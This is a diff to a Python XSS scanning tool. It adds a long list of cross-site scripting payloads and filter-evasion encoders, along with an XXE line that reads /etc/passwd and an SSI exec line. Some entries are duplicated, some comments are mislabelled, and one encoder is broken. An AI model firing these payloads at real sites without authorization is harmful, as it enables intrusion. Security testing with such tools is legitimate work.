@@ -9,6 +9,7 @@ import sqlite3
 import signal
 from datetime import datetime
 import time
+import base64
 
 cursor = "|"
 
@@ -23,6 +24,7 @@ def animate_cursor():
 cursor_thread = threading.Thread(target=animate_cursor)
 cursor_thread.daemon = True
 cursor_thread.start()
+print(f"Loading{cursor}", end='\r')
 
 current_time = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
 requests.packages.urllib3.disable_warnings()
@@ -32,17 +34,6 @@ BLUE, RED, WHITE, YELLOW, MAGENTA, GREEN, END = '\33[94m', '\033[91m', '\33[97m'
 xss_payloads = [
     '<script>alert("XSS")</script>',
     '<img src="x" onerror="alert(\'XSS\')" />',
-    '<script>alert("XSS")</script>',
-    '<img src=x onerror=alert("XSS")>',
-    '<a href="javascript:alert(\'XSS\')">Click Me</a>',
-    '"><script>alert("XSS")</script>',
-    '"><img src=x onerror=alert("XSS")>',
-    '"><a href="javascript:alert(\'XSS\')">Click Me</a>',
-    'javascript:alert("XSS")',
-    'javascript:confirm("XSS")',
-    'javascript:eval("alert(\'XSS\')")',
-    '<script>alert("XSS")</script>',
-    '<img src=x onerror=alert("XSS")>',
     '<a href="javascript:alert(\'XSS\')">Click Me</a>',
     '"><script>alert("XSS")</script>',
     '"><img src=x onerror=alert("XSS")>',
@@ -57,6 +48,106 @@ xss_payloads = [
     '<a href="javascript:eval(\'alert(\\\'XSS\\\')\')">Click Me</a>',
     '<img src=x onerror=confirm("XSS")>',
     '<img src=x onerror=eval("alert(\'XSS\')")>',
+    '"><img src="x" onerror="alert(\'XSS\')" />',
+    '"><a href="javascript:alert(\'XSS\')">Click Me</a>',
+    '"><img src=x onerror=alert("XSS")>',
+    '"><a href="javascript:alert(\'XSS\')">Click Me</a>',
+    'javascript:alert("XSS")',
+    'javascript:confirm("XSS")',
+    'javascript:eval("alert(\'XSS\')")',
+    '<iframe src="javascript:alert(\'XSS\')"></iframe>',
+    '<form action="javascript:alert(\'XSS\')"><input type="submit"></form>',
+    '<input type="text" value="<img src=x onerror=alert(\'XSS\')>" />',
+    '<a href="javascript:confirm(\'XSS\')">Click Me</a>',
+    '<a href="javascript:eval(\'alert(\\\'XSS\\\')\')">Click Me</a>',
+    '<img src=x onerror=confirm("XSS")>',
+    '<img src=x onerror=eval("alert(\'XSS\')")>',
+    '<iframe src="javascript:alert(\'XSS\')"></iframe>',
+    '<form action="javascript:alert(\'XSS\')"><input type="submit"></form>',
+    '<input type="text" value="<img src=x onerror=alert(\'XSS\')>" />',
+    '<a href="javascript:confirm(\'XSS\')">Click Me</a>',
+    '<a href="javascript:eval(\'alert(\\\'XSS\\\')\')">Click Me</a>',
+    '<img src=x onerror=confirm("XSS")>',
+    '<img src=x onerror=eval("alert(\'XSS\')")>',
+    '<script>alert("XSS")</script>',
+    '<img src="x" onerror="alert(\'XSS\')" />',
+    '<a href="javascript:alert(\'XSS\')">Click Me</a>',
+    '"><script>alert("XSS")</script>',
+    '"><img src=x onerror=alert("XSS")>',
+    '"><a href="javascript:alert(\'XSS\')">Click Me</a>',
+    'javascript:alert("XSS")',
+    'javascript:confirm("XSS")',
+    'javascript:eval("alert(\'XSS\')")',
+    '<iframe src="javascript:alert(\'XSS\')"></iframe>',
+    '<form action="javascript:alert(\'XSS\')"><input type="submit"></form>',
+    '<input type="text" value="<img src=x onerror=alert(\'XSS\')>" />',
+    '<a href="javascript:confirm(\'XSS\')">Click Me</a>',
+    '<a href="javascript:eval(\'alert(\\\'XSS\\\')\')">Click Me</a>',
+    '<img src=x onerror=confirm("XSS")>',
+    '<img src=x onerror=eval("alert(\'XSS\')")>',
+    # ... (previous payloads)
+    '<img src=x onerror=alert("XSS")>',
+    '<a href="javascript:alert(\'XSS\')">Click Me</a>',
+    # XSS Locator (Polygot)
+    '\'; alert(String.fromCharCode(88,83,83))//\'; alert(String.fromCharCode(88,83,83))//"; alert(String.fromCharCode(88,83,83))//"; alert(String.fromCharCode(88,83,83))//--></SCRIPT>">\'; alert(String.fromCharCode(88,83,83))//\'; alert(String.fromCharCode(88,83,83))//"; alert(String.fromCharCode(88,83,83))//"; alert(String.fromCharCode(88,83,83))//--></SCRIPT>',
+    # Malformed A Tags
+    '<a foo=a src="javascript:alert(\'XSS\')">Click Me</a>',
+    '<a foo=a href="javascript:alert(\'XSS\')">Click Me</a>',
+    # Malformed IMG Tags
+    '<img foo=a src="javascript:alert(\'XSS\')">',
+    '<img foo=a onerror="alert(\'XSS\')">',
+    # fromCharCode
+    '\';alert(String.fromCharCode(88,83,83))//\';alert(String.fromCharCode(88,83,83))//";alert(String.fromCharCode(88,83,83))//";alert(String.fromCharCode(88,83,83))//--></SCRIPT>">\';alert(String.fromCharCode(88,83,83))//\';alert(String.fromCharCode(88,83,83))//";alert(String.fromCharCode(88,83,83))//";alert(String.fromCharCode(88,83,83))//--></SCRIPT>',
+    # Default SRC Tag to Get Past Filters that Check SRC Domain
+    '<img src="http://example.com/image.jpg">',
+    # Default SRC Tag by Leaving it Empty
+    '<img src="">',
+    # Default SRC Tag by Leaving it out Entirely
+    '<img>',
+    # On Error Alert
+    '<img src=x onerror=alert("XSS")>',
+    # IMG onerror and JavaScript Alert Encode
+    '<img src=x onerror=eval(String.fromCharCode(97,108,101,114,116,40,49,41))>',
+    # Decimal HTML Character References
+    '&#34;><img src=x onerror=alert(\'XSS\')>',
+    # Decimal HTML Character References Without Trailing Semicolons
+    '&#34><img src=x onerror=alert(\'XSS\')>',
+    # Hexadecimal HTML Character References Without Trailing Semicolons
+    '&#x22><img src=x onerror=alert(\'XSS\')>',
+    # List-style-image
+    '<style>li {list-style-image: url("javascript:alert(\'XSS\')");}</style><ul><li></ul>',
+    # VBscript in an Image
+    '<img src="vbscript:alert(\'XSS\')">',
+    # SVG Object Tag
+    '<svg><p><style><img src=1 href=1 onerror=alert(1)></p></svg>',
+    # ECMAScript 6
+    '<a href="javascript:void(0)" onmouseover="alert(1)">Click Me</a>',
+    # BODY Tag
+    '<BODY ONLOAD=alert(\'XSS\')>',
+    # <BODY ONLOAD=alert('XSS')>
+    '<BODY ONLOAD=alert(\'XSS\')>',
+    # Event Handlers
+    '<img onmouseover="alert(\'XSS\')" src="x">',
+    # Various Tags with Broken-up for XSS
+    '<s<Sc<script>ript>alert(\'XSS\')</script>',
+    # TABLE
+    '<TABLE><TD BACKGROUND="javascript:alert(\'XSS\')">',
+    # TD
+    '<TD BACKGROUND="javascript:alert(\'XSS\')">',
+    # DIV
+    '<DIV STYLE="width: expression(alert(\'XSS\'));">',
+    # BASE TAG
+    '<BASE HREF="javascript:alert(\'XSS\');//">',
+    # OBJECT TAG
+    '<OBJECT TYPE="text/x-scriptlet" DATA="http://ha.ckers.org/xss.html"></OBJECT>',
+    # SSI XSS
+    '<!--#exec cmd="/bin/echo \'<SCR\'+\'IPT>alert("XSS")</SCR\'+\'IPT>\'"-->',
+    # HTML+TIME IN XML
+    '<?xml version="1.0" encoding="ISO-8859-1"?><foo><![CDATA[<]]>SCRIPT<![CDATA[>]]>alert(\'XSS\')<![CDATA[<]]>/SCRIPT<![CDATA[>]]></foo>',
+    # Using ActionScript Inside Flash
+    '<SWF><PARAM NAME=movie VALUE="javascript:alert(\'XSS\')"></PARAM><embed src="javascript:alert(\'XSS\')"></embed></SWF>',
+    # MIME
+    '<!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]><foo>&xxe;</foo>',
 ]
 
 obfuscation_methods = [
@@ -64,15 +155,34 @@ obfuscation_methods = [
     lambda payload: payload.replace("alert", "confirm") if payload else payload,
     lambda payload: "".join(f"\\x{ord(char):02x}" for char in payload) if payload else payload,  # Hex encoding
     lambda payload: "".join(f"\\u{ord(char):04x}" for char in payload) if payload else payload,  # Unicode encoding
-    lambda payload: base64.b64encode(payload.encode()).decode(errors='ignore'),  # Base64 encoding
-    lambda payload: payload.encode('utf-16').decode(errors='ignore'),  # UTF-16 encoding (with error handling)
-    lambda payload: payload.encode('utf-32').decode(errors='ignore'),  # UTF-32 encoding (with error handling)
-    lambda payload: payload.encode('rot_13').decode(errors='ignore'),  # ROT13 encoding
+    lambda payload: base64.b64encode(payload.encode()).decode(errors='ignore') if payload is not None else None,  # Base64 encoding
+    lambda payload: payload.encode('utf-16').decode(errors='ignore') if payload is not None else None,  # UTF-16 encoding (with error handling)
+    lambda payload: payload.encode('utf-32').decode(errors='ignore') if payload is not None else None,  # UTF-16 encoding (with error handling)
+    lambda payload: payload.encode('rot_13').decode(errors='ignore') if payload is not None else None,  # UTF-16 encoding (with error handling)
     lambda payload: "".join(f"%{ord(char):02X}" for char in payload) if payload else payload,  # Percent encoding
     lambda payload: "".join(f"&#x{ord(char):X};" for char in payload) if payload else payload,  # HTML Entity encoding
-    lambda payload: payload.replace('a', '\x00a').replace('l', '\x00c'),  # Null Byte encoding
+    lambda payload: payload.replace('a', '\x00a').replace('l', '\x00c') if payload is not None and isinstance(payload, str) else payload,  # Null Byte encoding
+    lambda payload: payload.encode('base64').decode(errors='ignore') if payload is not None else None,    # Base64 encoding
+    lambda payload: payload.encode('utf-16le').decode(errors='ignore') if payload is not None else None,    # UTF-16 Little-Endian encoding
+    lambda payload: payload.encode('utf-32le').decode(errors='ignore') if payload is not None else None,    # UTF-32 Little-Endian encoding
+    lambda payload: payload[::-1],  # Reverse the payload
+    lambda payload: payload.upper(),  # Convert to uppercase
+    lambda payload: payload.lower(),  # Convert to lowercase
+    lambda payload: payload.swapcase(),  # Swap case (upper to lower and vice versa)
+    lambda payload: "".join(f"%u{ord(char):04X}" for char in payload) if payload else payload,  # Percent-Encoded Unicode
+    lambda payload: "".join(f"%{ord(char):02X}" for char in payload) if payload else payload,  # Percent-Encoded ASCII
+  # Additional obfuscation methods
+    lambda payload: "".join(f"%U{ord(char):08X}" for char in payload) if payload else payload,  # Uppercase Percent-Encoded Unicode
+    lambda payload: "".join(f"%U{ord(char):08X}" for char in payload) if payload else payload,  # Uppercase Percent-Encoded Unicode
+    lambda payload: "".join(f"%{ord(char):02X}; " for char in payload) if payload else payload,  # Percent Encoding with Spaces
+    lambda payload: "".join(f"%u{ord(char):04X}; " for char in payload) if payload else payload,  # Unicode Percent Encoding with Spaces
+    lambda payload: payload.replace('<', '&lt;').replace('>', '&gt;'),  # HTML Entity Encoding for < and >
+    lambda payload: payload.replace('"', '&quot;').replace('\'', '&#39;'),  # HTML Entity Encoding for " and '
+    lambda payload: "".join(f"\\{char}" for char in payload),  # Single Backslash Escaping
+    lambda payload: "".join(f"\\\{char}" for char in payload),  # Double Backslash Escaping
+    lambda payload: "".join(f"%{ord(char):X} " for char in payload) if payload else payload,  # Percent Encoding with Spaces
+    lambda payload: "".join(f"&#x{ord(char):X} " for char in payload) if payload else payload,  # HTML Entity Encoding with Spaces
 ]
-
 
 def get_arguments():
     parser = argparse.ArgumentParser(description='Advanced XSS Reporter')
